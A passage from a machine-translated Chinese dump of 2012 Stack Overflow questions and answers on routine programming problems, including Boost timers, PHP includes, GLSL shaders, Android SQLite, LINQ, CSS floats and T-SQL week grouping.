> 有什么办法可以检查图像的高度、宽度是否大于 400 像素，如果是，则执行调整大小

```
$resizeObj = new resize($path);

if (($resizeObj->width > 400) || ($resizeObj->height > 400))
{
    $resizeObj->resizeImage(200, 200, 'crop');
    $resizeObj->saveImage($path, 1000);
} 
```

# c++ - 如何同时使用 boost auto_cpu_timer 和 progress_display？

> ID：12760828
> 
> 赞同：2
> 
> 时间：2012-10-06T14:50:16.827
> 
> 标签：c++, boost, timer

我想使用 boost`auto_cpu_timer`来显示我的完整代码需要运行的时间。此外，我想查看我的循环使用的进度`progress_display`。

似乎存在命名空间冲突，因为 Boost 有两个计时器类，其中`progress_display`来自旧的、现已弃用的库。

[http://www.boost.org/doc/libs/1_51_0/libs/timer/doc/index.html](http://www.boost.org/doc/libs/1_51_0/libs/timer/doc/index.html)

不过，有没有办法实现这一目标？以下示例显示了我正在尝试做的事情。使用其中一个`AUTO`或`PROG`工作正常，但两者一起导致错误消息。

**主要：**编译与`g++ -lboost_timer main.cc -o time`

```
#define AUTO
#define PROG

#ifdef  PROG
#include <boost/progress.hpp>
#endif     //----  PROG  -----

#ifdef  AUTO
#include <boost/timer/timer.hpp>
#endif     //----  AUTO  -----

#include <cmath>

int main()
{
#ifdef  AUTO
    boost::timer::auto_cpu_timer t;
#endif     //----  AUTO  -----

    long loops = 100000000;

#ifdef  PROG
    boost::progress_display pd( loops );
#endif     //----  PROG  -----

    //long loop to burn some time
    for (long i = 0; i < loops; ++i)
    {
        std::sqrt(123.456L);
#ifdef  PROG
        ++pd;
#endif     //----  PROG  -----
    }

    return 0;
} 
```

**错误日志：**

```
/usr/include/boost/timer/timer.hpp:38:1: error: ‘namespace boost::timer { }’ redeclared as different kind of symbol
/usr/include/boost/timer.hpp:45:1: error: previous declaration of ‘class boost::timer’
/usr/include/boost/timer/timer.hpp: In member function ‘std::string boost::timer::cpu_timer::format(short int, const std::string&) const’:
/usr/include/boost/timer/timer.hpp:74:34: error: ‘format’ is not a member of ‘boost::timer’
/usr/include/boost/timer/timer.hpp: In member function ‘std::string boost::timer::cpu_timer::format(short int) const’:
/usr/include/boost/timer/timer.hpp:76:34: error: ‘format’ is not a member of ‘boost::timer’
main.cc: In function ‘int main()’:
main.cc:17:2: error: ‘auto_cpu_timer’ is not a member of ‘boost::timer’
main.cc:17:31: error: expected ‘;’ before ‘t’ 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-06T15:09:32.243

当您包含`boost/progress.hpp`时，C++ 编译器会`boost::timer`看到包含`class timer`在.`boost/timer.hpp``boost/progress.hpp`

当您包含`boost/time/timer.hpp`时，C++ 编译器会将 的另一个定义`boost::timer`视为命名空间，这就是错误的原因。

如果您真的想使用它，解决方案是`boost::timer`通过宏重命名其中之一。但是因为`namespace boost::timer`包含在标头之外实现的函数（例如`std::string format(const cpu_times& times, short places, const std::string& format)`），所以您必须重命名`class boost::timer`. 所以你的代码将是这样的：

```
#ifdef  PROG
#define timer   timer_class
#include <boost/progress.hpp>
#undef timer
#endif     //----  PROG  -----

#ifdef  AUTO
#include <boost/timer/timer.hpp>
#endif     //----  AUTO  ----- 
```

# jsf - 如何在 p:TabMenu 中使用 ui:composition

> ID：12760831
> 
> 赞同：0
> 
> 时间：2012-10-06T14:50:58.150
> 
> 标签：jsf, jsf-2

我正在研究如何使用 Primefaces 3.4.1 的示例`p:TabMenu`：

主页：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"    
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:p="http://primefaces.org/ui"
      xmlns:c="http://java.sun.com/jsp/jstl/core">
    <h:head>

    </h:head>
    <h:body>

        <div id="settingsHashMapz" class="settingsHashMap" style="width:1150px; height:400px; position:absolute; top:20px; left:1px">

            <p:tabMenu id="tabs" activeIndex="0" >  
                <p:menuitem value="tab1" url="/tab1.jsf" />  
                <p:menuitem value="tab2" url="/tab2.jsf" />  
                <p:menuitem value="tab3" url="/tab3.jsf" />

            </p:tabMenu>  
        </div>   
    </h:body>
</html> 
```

选项卡 1 页：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"    
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:p="http://primefaces.org/ui"
      xmlns:c="http://java.sun.com/jsp/jstl/core">
    <h:head>

    </h:head>
    <h:body>
        <ui:composition>
            <h:panelGroup>
                <h:form id="tab1" >
                    ................. 
                </h:form>         
            </h:panelGroup>
        </ui:composition>
    </h:body>
</html> 
```

当我尝试使用`p:tabMenu`. 我不能`ui:composition`正常使用。我必须在每个标签页中声明名称空间，因为它们不能使用 JSF 主页面中的名称空间。如果我将所有命名空间声明到标签页中，我必须等待约 3 秒才能从服务器传输 Javascript 库。如您所见，这是浪费资源：

```
GET http://server:8080/DCProfileTabGenerators.jsf 200 OK 29ms                              jquery....min.js (line 4)
GET http://server:8080/javax.f...uery/jquery.js.jsf?ln=primefaces&_=1349526707969 200 OK 11ms   jquery....min.js (line 4)
GET http://server:8080/javax.f.../primefaces.js.jsf?ln=primefaces&_=1349526708568 200 OK 8ms   jquery....min.js (line 4)
GET http://server:8080/javax.f...source/jsf.js.jsf?ln=javax.faces&_=1349526708949 200 OK 8ms   jquery....min.js (line 4)
GET http://server:8080/resources/js/tabs.js?_=1349526709016 200 OK 10ms 
```

如何使用在 JSF 主页面中声明的名称空间进入选项卡 JSF 页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-07T13:35:26.437

Declaring namespaces at the top of the page does not impart any real performance loss. It just declares which namespaces you wish to use on a given page file. In essence there is no real way to do this however it is not necessary.

The GET requests below are for downloading the necessary javascript libraries, stylesheets and images to the client. Depending on the client browser settings, these should be cached after the first request so that this client will not have to download them multiple times as they navigate pages throughout your application.

# php - 如何正确包含

> ID：12760833
> 
> 赞同：1
> 
> 时间：2012-10-06T14:51:17.823
> 
> 标签：php

```
; Windows: "\path1;\path2"
include_path = “.;C:\xampp\php\PEAR;C:\xampp\php\Zend;C:\xampp\htdocs\rpg_historian;” 
```

在上面，您将在我的 xampp 服务器上的 php.ini 中找到我的包含路径的地址。我希望能够包含嵌套在我的项目 rpg_historian 中的名为“includes”的文件夹中的文件。在 PHP 中，当我使用 -

```
<?php include('includes/header.php'); ?> 
```

该页面可以正常工作并正确加载。但是，如果我单击一个链接，该链接将我发送到包含的内部/我最终会处于页面将显示的位置 -

```
> Object not found!
> 
> The requested URL was not found on this server. The link on the
> referring page seems to be wrong or outdated. Please inform the author
> of that page about the error.
> 
> If you think this is a server error, please contact the webmaster.
> 
> Error 404
> 
> localhost 10/06/12 09:46:58 Apache/2.2.21 (Win32) mod_ssl/2.2.21
> OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1 
```

我的 URL 变成`http://localhost/rpg_historian/includes/index.php`了不是 index.php 所在的位置。index.php 位于 rpg_historian 的根目录中。如何设置一个可以轻松设置包含的系统？我已经尝试了位于 [http://www.geeksengine.com/article/php-include-path.html的说明](http://www.geeksengine.com/article/php-include-path.html)

但是，即使在设置了包含路径之后，也是出于什么原因；它仍然不想正常工作。有人可以向我解释如何设置一个适当的 PHP 包含系统，让我可以轻松地从文件夹中访问文件吗？我的理解是，如果设置正确，PHP 足够智能，可以通过文件夹级联“查找内容”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:56:35.240

修改你的链接：

`<a href='../index.php' >`或者`<a href='<?=$_SERVER["SERVER_NAME"]?>/rpg_historian/index.php' >`

Windows 系统变量与 PHP 包含函数无关。

如果包含文件的原始 Windows 路径是这样的： `C:\xampp\htdocs\rpg_historian\includes\header.php`

`<?php include('includes/header.php'); ?>`并从这里调用具有此内容的文件：`C:\xampp\htdocs\`

比试试这个：`<?php include('rpg_historian/includes/header.php'); ?>`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:04:13.603

包含路径可以是绝对路径，即：

```
include('C:/xampp/htdocs/rpg_historian/includes/header.php'); 
```

或相对的（就像你现在拥有的那样）。如果它是相对的，那么它是相对于包含它的文件的。

现在，通常的解决方案是包含相对于文档根目录：

```
include($_SERVER['DOCUMENT_ROOT'] . '/rpg_historian/includes/header.php'); 
```

或者使用某种模式（如[前端控制器](http://en.wikipedia.org/wiki/Front_Controller_pattern)）来保证以一致的方式处理包含，然后您可以`include_path`通过在路径前添加一个点（如`include('./includes/header.php')`）或使用魔术常量来克服该指令`__DIR__`：

```
include(__DIR__ '/includes/header.php'); 
```

现在，所有这些都与包含有关，但您的问题似乎与生成链接有关（否则您将永远不会`include`仅通过 HTML 超链接进入目录）。为了避免这种情况，请确保您的 HTML 链接指向正确的位置，而不是指向本地 ( `include`) 目录。

# opengl-es - 我可以从片段着色器中知道我正在处理哪个三角形吗？

> ID：12760834
> 
> 赞同：1
> 
> 时间：2012-10-06T14:51:33.750
> 
> 标签：opengl-es, opengl-es-2.0, glsl

我正在绘制一个具有 100 到 2500 个三角形面的中型到大型对象，具体取决于用户之前选择的一些选项。物体本身是固定的——不会移动，不会发生任何变化，什么都没有。到目前为止，您可以将事情想象为“我的应用程序加载 OBJ 文件，然后用户查看它们”，您不会错太多。

棘手的一点是，在任何时候，对象上的一些面都会被“选中”，而另一些则不会。所选面必须以不同的纹理显示——相同的 UV 坐标，但像素颜色来自不同的位图。在任何给定时间将选择大约一半的面，哪些面会不断变化。

因此，显而易见的事情是，在片段着色器中，如果我正在处理选定的面，请在此位图上调用 texture2D()，如果我在未选择的三角形中，请使用那个。只是，我看不到从片段着色器中找出我所在的三角形的方法。这是我的问题：我能知道吗？

我确实有一个替代方案——用自己的顶点副本设置每个面，将纹理位图的大小加倍，在每个面的顶点上设置 UV 坐标以指向“选定”或“取消选定”部分位图——但是顶点的数量增加了 6 倍，而且我每帧都将一个全新的 UV 数组传递给 GPU，而且……是的。明显慢，即使在小物体上也是如此。不好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T16:54:16.600

片段着色器不知道它在哪个三角形中。但是，可以通过使用额外的顶点属性来获得您想要的效果。

不幸的是，这通常意味着您必须以与进行硬折痕时相同的方式复制每个三角形的顶点数据——没有简单的方法可以做到这一点，至少在它必须与*任何*类型一起工作时不是这样。的选择。
但是，使用单独的流，您实际上只需要每帧上传一个属性，其余的都是不变的。就带宽而言，这是完全可以接受的。

然后，片段着色器将对两个纹理进行静态采样，并根据特殊顶点属性是 1.0 还是 0.0 来选择一个值或另一个值（这比每次分支和采样不同的纹理更有效，这可能无论如何都会对两个纹理进行采样） . 您可以`mix`为此使用内在函数（这通常会导致单个本机 1 周期指令）或三元运算符。

对于某些不需要您复制顶点数据的选择子集，一种可行的替代方法是在 1.0 处截断的属性上使用阶跃函数——需要顶点复制的问题是插值。
如果任何单个顶点属性为零，则任何片段（除了恰好在具有“1.0”的顶点下的片段之外）的插值将必然小于 1.0。另一方面，除“0.0”顶点下或恰好在两个“0.0”顶点之间的线上的片段以外的任何片段都将是非零的。这不适用于*每个任意*选择，但在许多情况下，使用诸如“选择任何非零值”（或相反的方式）之类的策略可能会起作用，而不会复制顶点数据。

Having ARB_provoking_vertex would ease your life, but alas... no ES 2.0 implementation will likely provide that.

# android-listview - 无法从 sqlite 数据库中的第二个表中检索并显示在列表视图中

> ID：12760835
> 
> 赞同：0
> 
> 时间：2012-10-06T14:51:59.757
> 
> 标签：android-listview, android-sqlite

数据库适配器

```
//User Table

public static final String KEY_ROWID = "_id";
public static final String KEY_UNAME = "name";
public static final String KEY_USURNAME = "surname";
public static final String KEY_UUSERNAME = "username";
public static final String KEY_UPASSWORD = "password";
public static final String KEY_UEMAILADDRESS = "emailadd";

//Account Table
public static final String KEY_ROWID1 = "_id1";
public static final String KEY_BANKNAME =" bankname";
public static final String KEY_TYPE = " type";
public static final String KEY_ACCNUM = " accnum";
public static final String KEY_BALANCE = " balance";
public static final String KEY_EXPIRYDATE = " expirydate";

//Database
private static final String DATABASE_NAME = "MMS2";
public static final String DATABASE_TABLE = " Usertb";
    public static final String DATABASE_TABLE1 = " Accounttb";
private static final String DATABASE_TABLE2 = " Transactiontb";
private static final String DATABASE_TABLE3 = " Categorytb";

//Database Version
private static final int DATABASE_VERSION = 1;
private static String Usertb;
private static String Accounttb;

private DbHelper MHelper;
private final Context MContext;
private SQLiteDatabase Mdatabase;

private static final String DATABASE_USER_TABLE = "CREATE TABLE" + DATABASE_TABLE + "  (" +
        KEY_ROWID + " INTEGER PRIMARY KEY, " +
        KEY_UNAME + " TEXT , " +
        KEY_USURNAME + " TEXT , " +
        KEY_UUSERNAME + " TEXT , " +
        KEY_UPASSWORD + " TEXT , " +
        KEY_UEMAILADDRESS + " TEXT );" ;

private static final String DATABASE_ACCOUNT_TABLE1 = "CREATE TABLE" + DATABASE_TABLE1 + " (" +
        KEY_ROWID1 + " INTEGER PRIMARY KEY, " +
        KEY_BANKNAME + " TEXT , " +
        KEY_TYPE + " TEXT , " +
        KEY_ACCNUM + " TEXT , " +
        KEY_BALANCE + " TEXT , " +
        KEY_EXPIRYDATE + " TEXT  );" ;

private static class DbHelper extends SQLiteOpenHelper{

    public DbHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onCreate(SQLiteDatabase db) {

        db.execSQL(DATABASE_USER_TABLE);
        db.execSQL(DATABASE_ACCOUNT_TABLE1);

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // TODO Auto-generated method stub
        db.execSQL("DROP TABLE IF EXISTS " + DATABASE_USER_TABLE);
        db.execSQL("DROP TABLE IF EXISTS" + DATABASE_ACCOUNT_TABLE1);
        onCreate(db);

    }
}

public DatabaseAdapter(Context c){
    MContext = c;
}

public DatabaseAdapter open(){
    MHelper = new DbHelper(MContext);
    Mdatabase = MHelper.getWritableDatabase();
    return this;
}

public void close(){

    MHelper.close();
}
    public Cursor fetchListItems() {

        Cursor cursor = Mdatabase.query(DATABASE_TABLE1, new String[] 
                      { KEY_ROWID1, KEY_BANKNAME, KEY_TYPE, KEY_BALANCE}, 
                      null, null, null, null, null);

        if (cursor != null) {
            cursor.moveToFirst();
        }
        return cursor;
    } 
```

}

事务列表视图

```
DatabaseAdapter dbHelper = new DatabaseAdapter(this);
        dbHelper.open();

        // Get a Cursor for the list items
        Cursor listCursor = dbHelper.fetchListItems();
        startManagingCursor(listCursor);

        // set the custom list adapter
        setListAdapter(new MyListAdapter(this, listCursor));
    }

    private class MyListAdapter extends ResourceCursorAdapter {

        public MyListAdapter(Context context, Cursor cursor) {
            super(context, R.layout.list_item_with_description, cursor);
        }

        @Override
        public void bindView(View view, Context context, Cursor cursor) {

            TextView title = (TextView) view.findViewById(R.id.item_title);
            title.setText(cursor.getString(
                        cursor.getColumnIndex(DatabaseAdapter.KEY_BANKNAME)));

            TextView details = (TextView) view.findViewById(R.id.item_details);
            StringBuffer detailsText = new StringBuffer();

            int price = cursor.getInt(cursor.getColumnIndex(DatabaseAdapter.KEY_BALANCE));
            if (price > 0){
                detailsText.append("$"+price+".00");
            } else {
                detailsText.append("Price Unavailable");
            }
            String description = cursor.getString(cursor.getColumnIndex(
                                                    DatabaseAdapter.KEY_TYPE));
            if (description != null && description.length() > 0){
                detailsText.append(", "+description);
            }
            details.setText(detailsText.toString());

        }

    }

} 
```

我收到了这个错误

> 10-06 17:52:21.107：I/Database(708)：sqlite 返回：错误代码 = 1，msg = 没有这样的列：_id1

# image - 使用 Matlab 合并两个二进制图像

> ID：12760836
> 
> 赞同：1
> 
> 时间：2012-10-06T14:52:15.223
> 
> 标签：image, matlab

我需要使用 Matlab 创建两个不同的黑色二进制矩形，以覆盖两者的一部分并提取插入。

如何叠加两个二进制图像？

```
-------|----------|
|      |     2    |
|    1 |----|-----|
|           |
|-----------| 
```

我使用`false(X, Y)`Matlab 函数创建了两个二进制图像。

我没有找到如何生成两个图像的合并和提取插入。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:35:27.473

在翻译它们之前制作一个可以包含两个矩形的背景矩阵，并将背景矩阵的值分配给矩形所在的区域。这样你就有了两个大小相同的矩阵，你可以在它们上进行逻辑或算术运算。如果您为每个矩形和背景使用不同的值，则总和之类的内容将以不同的颜色显示。这是一个演示的文本版本：

```
octave:11> bga = bgb = ones(10,10)
bga =

   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1

octave:12> bgb
bgb =

   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1

octave:13> a=false(3,4)
a =

   0   0   0   0
   0   0   0   0
   0   0   0   0

octave:14> b=false(5,5)
b =

   0   0   0   0   0
   0   0   0   0   0
   0   0   0   0   0
   0   0   0   0   0
   0   0   0   0   0

octave:15> bga(3:5,4:7) = a
bga =

   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   0   0   0   0   1   1   1
   1   1   1   0   0   0   0   1   1   1
   1   1   1   0   0   0   0   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1

octave:16> bgb(1:5,1:5) = b
bgb =

   0   0   0   0   0   1   1   1   1   1
   0   0   0   0   0   1   1   1   1   1
   0   0   0   0   0   1   1   1   1   1
   0   0   0   0   0   1   1   1   1   1
   0   0   0   0   0   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1

octave:17> bga | bgb
ans =

   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   0   0   1   1   1   1   1
   1   1   1   0   0   1   1   1   1   1
   1   1   1   0   0   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1
   1   1   1   1   1   1   1   1   1   1 
```

# c# - 从数据库检索图像时发生错误使用 Linq 查询

> ID：12760837
> 
> 赞同：0
> 
> 时间：2012-10-06T14:52:15.413
> 
> 标签：c#

以下代码我曾经通过 linq 查询从数据库中检索图像，但我得到了类似的错误

**LINQ to Entities 无法识别方法“System.String ToString(System.String)”方法，并且该方法无法转换为存储表达式。**

用 //error 编码的错误行发生了。

```
public void ProcessRequest (HttpContext context) {

        HttpRequest req = context.Request;

        MembershipUser user_id1 = Membership.GetUser();
        string user_id = user_id1.ProviderUserKey.ToString();      

        // string categoryID =Convert.ToInt32("4");// req.QueryString["CategoryID"].ToString();
        // Get information about the specified category          
        TMSEntities db = new TMSEntities();
        //get User ID From Login

        var category = (from data in db.Register1_db
                       where data.User_ID == Convert.ToString(user_id)
                       select data.Student_Photo);

        //error occurred.
        int len = category.First().Length;

        // Output the binary data          
        // But first we need to strip out the OLE header          
        int OleHeaderLength = 78;
        int strippedImageLength = len - OleHeaderLength;
        byte[] imagdata = new byte[strippedImageLength];          
        Array.Copy(category.First().ToArray(), OleHeaderLength, imagdata, 0, strippedImageLength);          
        if ((imagdata) != null)          
        {              
            MemoryStream m = new MemoryStream(imagdata);              
            System.Drawing.Image image = System.Drawing.Image.FromStream(m);              
            image.Save(context.Response.OutputStream, ImageFormat.Jpeg);          
        }

}

public bool IsReusable {
    get {
        return false;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:56:32.640

查看给出错误的行；

```
var category = (from data in db.Register1_db
                where data.User_ID == Convert.ToString(user_id)
                select data.Student_Photo); 
```

`Convert.ToString(user_id)`不是可以在 Linq to Entities 中使用的表达式。

查看您的代码时，我可以看到它`user_id`已经是一个字符串并且不需要转换，所以这应该会更好；

```
var category = (from data in db.Register1_db
                where data.User_ID == user_id
                select data.Student_Photo); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:57:19.580

这个应该工作：

```
var string_id = Convert.ToString(user_id);
var category = (from data in db.Register1_db
                       where data.User_ID == string_id
                       select data.Student_Photo); 
```

LINQ 创建表达式树，因此`Convert.ToString`不会被调用，但必须由 LINQ 提供程序解释。

# html - 为什么我在 div 上看不到我的背景

> ID：12760838
> 
> 赞同：2
> 
> 时间：2012-10-06T14:52:20.543
> 
> 标签：html

我有一个容器，我有 float:left 在它的子 div 里面。问题是，一旦我在子 div 上应用 float:left，我的父 div 的背景就完全丢失了。

```
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>

        <div style="background: #CCC; width:100%; position:relative;">
            <div style="float:left;">
                This is some text
            </div>
        </div>
    </body>
</html> 
```

谁能告诉我如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:55:55.457

`float` elements do not have `height` unless you clear them below or give explicit `height`

Try this,

```
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>

        <div style="background: #CCC; width:100%; height:50px;position:relative;">
            <div style="float:left;">
                This is some text
            </div>
        </div>
    </body>
</html>
```

OR

```
 <!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <div style="background: #CCC; width:100%; position:relative;">
            <div style="float:left;">
                This is some text
            </div>
            <div style='clear:left'></div>
        </div>

    </body>
</html>
```

OR use this hack of setting `overflow` of element.

```
 <!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <div style="background: #CCC; width:100%; overflow:hidden;position:relative;">
            <div style="float:left;">
                This is some text
            </div> 
        </div>

    </body>
</html>
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:00:38.927

啊，你打败了我……

你的内部（嵌套）`div`是浮动的，所以你的外部`div`正在崩溃。你有几个选择：

1.  在浮动 div 中放置一个空`clear`div
2.  将`overflow:hidden`样式应用于外部 div
3.  删除内部 div，并浮动外部 div

# php - PHP CURL 在同一过程中将文件下载到两个位置？

> ID：12760847
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:53:03.757
> 
> 标签：php, curl

嗨，我想用 CURL 下载 1 个文件并将其保存在 1 个位置并在浏览器上显示，而无需重新下载文件，类似于：

```
$fp=fopen("cache/".$URL['filename'],"w");
$ch = curl_init($this->URL['href']);
$this->curlOptions[CURLOPT_FILE] = $fp;
curl_setopt_array($ch, $this->curlOptions);
curl_exec($ch);
fclose($fp);
curl_close($ch); 
```

此示例保存文件但未在浏览器上显示。

请问有什么帮助吗？？

不好意思，我没有解释清楚，我需要先在浏览器中显示，然后保存到文件中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:54:15.677

添加一个

```
readfile("cache/".$URL['filename']); 
```

在 curl_close() 之后。这将使用您刚刚下载/保存的副本将文件的内容转储到浏览器。

# java - Http 进入外部 url

> ID：12760849
> 
> 赞同：3
> 
> 时间：2012-10-06T14:53:33.493
> 
> 标签：java, javascript, ajax

我必须创建一个必须进入公共 url 的函数，它会返回一个纯文本至极。

根据这一点，我将进行验证。

我尝试使用 dojo ajax get 方法来实现它，但由于它是一个不同的域，它不会工作（仅在资源管理器上）。

我如何向外部域发出呼叫并管理答案。

网址将是这样的。

```
http://my.socket:8080/?option1=1&option2=2 
```

它可以是 ajax 或只是一个 java 类。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:58:54.650

ajax is working on client side which means you are not able to make foreign domain ajax calls due to [http://en.wikipedia.org/wiki/Same_origin_policy](http://en.wikipedia.org/wiki/Same_origin_policy)

it will be good technique if you write that GET call in your applications server side and make ajax call to your application which will act as gateway and fetch data from remote server

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:04:15.577

由于同源策略，您不能跨域进行简单的 ajax 调用。

您可以通过 ajax 调用位于同一域中的您自己的服务器页面，并且该页面可以执行 HTTP 获取并为您获取内容。

或者你可以使用[YQL](http://developer.yahoo.com/yql/console/)

```
var url = 'http://my.socket:8080/?option1=1&option2=2'; // website you want to scrape
var yql = 'http://query.yahooapis.com/v1/public/yql?q=' + encodeURIComponent('select * from html where url="' + url + '"') + '&format=json&callback=?';  
$.getJSON(yql,function(data){  
    if(data.query.results){
        var result = data.query.results.double.content.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '');
        alert(result);
    }
}); 
```

[参考](https://stackoverflow.com/questions/11239584/cross-domain-post-method-ajax-call-using-jquery-with-xml-response/11240217#11240217)

# sql - SQL-本月的周数而不是年份以及为什么查询在一个月内返回 6 周

> ID：12760850
> 
> 赞同：1
> 
> 时间：2012-10-06T14:53:34.673
> 
> 标签：sql, tsql

> **可能重复：**
> [TSQL 计算月份的周数](https://stackoverflow.com/questions/4928038/tsql-calculate-week-number-of-the-month)

这是我的 SQL 查询

```
 SELECT DATEPART(MONTH,PaymentDate) AS 'Month',
       DATEPART(WEEK,PaymentDate) AS 'Week #',
       SUM(COALESCE(Amount,0)) AS 'Amount',
       SUM(COALESCE(Balance,0)) AS 'Balance'
FROM Payment
WHERE     (MONTH(PaymentDate) = MONTH('2012-09-01'))
GROUP BY DATEPART(MONTH,PaymentDate),
DATEPART(WEEK,PaymentDate)
GO 
```

![在此处输入图像描述](../Images/aad12793badd064cc690c19f18318963.png)

我试图以每周的方式获得一个月的总付款。

现在我有两个问题

1）如您所见，它显示的是一年中的第 # 周而不是那个月。

2）它还显示 6 周组而不是 4 组。

我该如何解决。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T15:11:58.483

日期很难，因为日历是不合逻辑的。

我在这里的评论中假设公历。

如果您按“每月的几周”进行分组，您需要首先定义您希望看到的内容。如果您希望每个月的“第一周”从该月的第一天开始，那么每个月都会有五周，除了二月（四分之三）。

如果您希望“周”从特定的一天开始，那么每个月都会有五到六周，除了偶尔的二月。

假设您希望本月的第一周是第 1-7 天，第二周是第 8-14 天等，那么您最好的选择是使用类似

```
CASE
    WHEN DATEPART(DAY, PaymentDate) BETWEEN 1 AND 7 THEN 1
    WHEN DATEPART(DAY, PaymentDate) BETWEEN 8 AND 14 THEN 2
    WHEN DATEPART(DAY, PaymentDate) BETWEEN 15 AND 21 THEN 3
    WHEN DATEPART(DAY, PaymentDate) BETWEEN 22 AND 28 THEN 4
    ELSE 5
END 
```

（例如）。

然而，最重要的事情是准确定义您希望它在每种情况下的行为方式。然后查询可以跟随。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T18:49:09.717

感谢您的所有帮助，刚刚解决了:-)

```
SELECT 
             SUM(Amount) AS 'Amount',
             SUM(COALESCE(Balance,0)) AS 'Balance' ,
             CASE
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 1 AND 7 THEN 1
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 8 AND 14 THEN 2
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 15 AND 21 THEN 3
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 22 AND 28 THEN 4
            ELSE 5
        END   AS MyWeek

        FROM Payment
        WHERE     (MONTH(PaymentDate) = MONTH('2012-09-01'))
        GROUP BY (CASE
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 1 AND 7 THEN 1
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 8 AND 14 THEN 2
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 15 AND 21 THEN 3
            WHEN DATEPART(DAY, PaymentDate) BETWEEN 22 AND 28 THEN 4
            ELSE 5
        END 
        )
        GO 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T22:11:11.823

这就是我将如何编写您的查询：

```
 SELECT DATEPART(MONTH,PaymentDate) AS 'Month',
         datepart(wk,PaymentDate)-datepart(wk,'20120901')+1 AS 'Week #',
         SUM(COALESCE(Amount,0)) AS 'Amount',
         SUM(COALESCE(Balance,0)) AS 'Balance'
    FROM Payment
   WHERE PaymentDate >= '20120901'
     AND PaymentDate <  '20121001'
GROUP BY DATEPART(MONTH,PaymentDate),
         datepart(wk,PaymentDate); 
```

我将 PaymentDate 过滤器更改为一个范围，以修复 2 个错误：
**（1）**它没有考虑到年份
**（2）**它不是[SARGABLE](http://en.wikipedia.org/wiki/Sargable)，即因为您正在`PaymentDate`列上执行一个函数，它会忽略任何`PaymentDate`列上的索引

虽然您接受的解决方案只允许 5 个`week #`值，因为它将周定义为 1-7、8-14 等，但这个允许 2012 年 12 月的月份编号如下：

```
